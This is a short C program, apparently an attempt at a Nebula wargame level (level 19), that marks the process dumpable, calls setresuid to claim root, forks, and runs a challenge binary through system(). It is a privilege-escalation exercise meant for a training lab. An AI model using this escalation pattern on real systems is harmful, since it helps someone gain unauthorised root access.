#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>

int main() {

    prctl(PR_SET_DUMPABLE,1,42,42,42);
    setresuid(0, 0, 0);
    int pid = fork();
    system("/root/Hafifot/nebula/19/st_uid_level19");
    return 0;
}
